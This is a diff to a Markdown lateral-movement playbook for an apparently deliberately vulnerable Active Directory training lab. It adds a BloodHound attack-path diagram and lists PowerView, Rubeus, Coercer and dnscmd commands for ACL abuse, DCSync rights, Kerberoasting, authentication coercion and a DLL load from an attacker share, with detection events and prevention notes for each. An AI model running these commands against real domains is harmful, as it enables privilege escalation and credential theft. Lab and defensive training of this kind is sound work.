@@ -6,6 +6,22 @@ Use these from your **Kali / BlackArch** attacker box on the host bridge, or —
 
 ---
 
+### BloodHound ACL Attack Vectors
+
+```mermaid
+graph LR
+    classDef user fill:#1d2b38,stroke:#00d2ff,stroke-width:2px,color:#fff;
+    classDef group fill:#3a1d38,stroke:#ff00d2,stroke-width:2px,color:#fff;
+
+    Dev[developer1]:::user -->|ForceChangePassword| Nick[nick.fury]:::user
+    Nick -->|WriteOwner| DA[Domain Admins]:::group
+    Nick -->|WriteSPN| SvcVision[svc_vision]:::user
+    QA[qa_user]:::user -->|AddSelf| Avengers[Avengers Admins]:::group
+    Shield[SHIELD Agents]:::group -->|GenericWrite| Avengers
+```
+
+---
+
 ### LAT-001 — PsExec with Pass-the-Hash
 **What it is:** classic — create a service over SMB/`ADMIN$`, execute, return output. PtH means you don't need a password, just a hash.
 **Why it works here:** SMB signing off; admin hashes recoverable.
@@ -195,25 +211,25 @@ ntlmrelayx.py -t ldaps://dc01.corp.local -wh attacker.corp.local --delegate-acce
 ---
 
 ### LAT-017 — ACL Abuse: ForceChangePassword
-**What it is:** `User-Force-Change-Password` extended right (or `GenericAll/Write`) lets you reset the target's password without knowing the old one.
-**Why it works here:** `helpdesk` has this on Domain Users.
-**Tools:** `net user`, `Set-DomainUserPassword` (PowerView), `rpcclient setuserinfo2`.
+**What it is:** You have `User-Force-Change-Password` over an object.
+**Tools:** PowerView, bloodyAD.
 **Steps:**
 ```powershell
-Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'Pwn3d!' -AsPlainText -Force)
+Set-DomainUserPassword -Identity nick.fury -AccountPassword (ConvertTo-SecureString "NewPassword1!" -AsPlainText -Force)
 ```
-**Detection:** Event `4724` (password reset by admin).
-**Prevention:** tier helpdesk; least privilege; just-in-time admin via PIM.
+*(In BloodHound data, `developer1` has `ForceChangePassword` on `nick.fury`)*
+**Detection:** 4724 (Attempt to reset account password by non-owner).
+**Prevention:** tier nick.fury; least privilege; just-in-time admin via PIM.
 
 ---
 
 ### LAT-018 — ACL Abuse: Add Members on Group
 **What it is:** `GenericWrite` on a group → add yourself.
-**Why it works here:** `helpdesk` has GenericWrite on `IT_Admins`.
+**Why it works here:** `SHIELD Agents` has GenericWrite on `Avengers Admins` (and `qa_user` has `AddSelf`).
 **Tools:** `net group`, `Add-DomainGroupMember`.
 **Steps:**
 ```powershell
-Add-DomainGroupMember -Identity 'IT_Admins' -Members alice
+Add-DomainGroupMember -Identity 'Avengers Admins' -Members qa_user
 ```
 **Detection:** Event `4728`/`4732`/`4756` (member added to security group).
 **Prevention:** group-policy-aware delegation; audit privileged group memberships.
@@ -227,13 +243,13 @@ Add-DomainGroupMember -Identity 'IT_Admins' -Members alice
 
 ### LAT-020 — ACL Abuse: WriteOwner
 **What it is:** ownership = the right to give yourself any right. WriteOwner on a target → take ownership → grant GenericAll → escalate.
-**Why it works here:** helpdesk has WriteOwner on Domain Admins (deliberate, do not "fix").
+**Why it works here:** nick.fury has WriteOwner on Domain Admins (deliberate, do not "fix").
 **Tools:** PowerView `Set-DomainObjectOwner`.
 **Steps:**
 ```powershell
-Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity alice
-Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity alice -Rights All
-Add-DomainGroupMember -Identity 'Domain Admins' -Members alice
+Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity nick.fury
+Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity nick.fury -Rights All
+Add-DomainGroupMember -Identity 'Domain Admins' -Members nick.fury
 ```
 **Detection:** Event `5136` modifying `nTSecurityDescriptor` on privileged group.
 **Prevention:** audit owner of privileged objects; lock down with AdminSDHolder.
@@ -245,7 +261,7 @@ Add-DomainGroupMember -Identity 'Domain Admins' -Members alice
 **Tools:** PowerView `Add-DomainObjectAcl -Rights DCSync`.
 **Steps:**
 ```powershell
-Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity alice -Rights DCSync
+Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity peter.parker -Rights DCSync
 ```
 **Detection:** Event `5136` on domain root; MDI "Modification to privileged AD object."
 **Prevention:** audit ACEs on `DC=corp,DC=local`; only DCs should have DCSync.
@@ -254,11 +270,12 @@ Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity alice 
 
 ### LAT-022 — ACL Abuse: WriteSPN → Kerberoast
 **What it is:** with `Validated-SPN` write on another user, add an SPN to them → Kerberoast → crack.
+**Why it works here:** nick.fury has `WriteSPN` on `svc_vision`.
 **Tools:** PowerView `Set-DomainObject -Set @{servicePrincipalName='http/x'}`.
 **Steps:**
 ```powershell
-Set-DomainObject -Identity victim -Set @{serviceprincipalname='nonexistent/x'}
-.\Rubeus.exe kerberoast /user:victim /outfile:roast.hashes
+Set-DomainObject -Identity svc_vision -Set @{serviceprincipalname='nonexistent/x'}
+.\Rubeus.exe kerberoast /user:svc_vision /outfile:roast.hashes
 ```
 **Detection:** Event `4738` (account changed) with SPN modification by non-admin.
 **Prevention:** restrict Validated-SPN write; monitor SPN additions.
@@ -284,7 +301,7 @@ Set-DomainObject -Identity victim -Set @{serviceprincipalname='nonexistent/x'}
 **Tools:** `Coercer`, `srvsvc.py`.
 **Steps:**
 ```bash
-python3 Coercer.py coerce -u alice -p 'DVADlab2024!' -d corp.local -l 10.10.0.100 -t file01.corp.local
+python3 Coercer.py coerce -u peter.parker -p 'DVADlab2024!' -d corp.local -l 10.10.0.100 -t file01.corp.local
 ```
 **Detection:** Sysmon `3` outbound from `svchost.exe` (WebClient).
 **Prevention:** disable WebClient; force SMB signing.
@@ -349,7 +366,7 @@ tscon 3 /dest:console
 
 ### LAT-031 — DnsAdmins → DLL Load on DC
 **What it is:** members of `DnsAdmins` can call `dnscmd /config /ServerLevelPluginDll \\attacker\share\evil.dll`. On DNS service restart → DLL loads as SYSTEM (DNS runs on DC).
-**Why it works here:** `helpdesk` is in DnsAdmins.
+**Why it works here:** `nick.fury` is in DnsAdmins.
 **Tools:** `dnscmd`, msfvenom for DLL.
 **Steps:**
 ```cmd
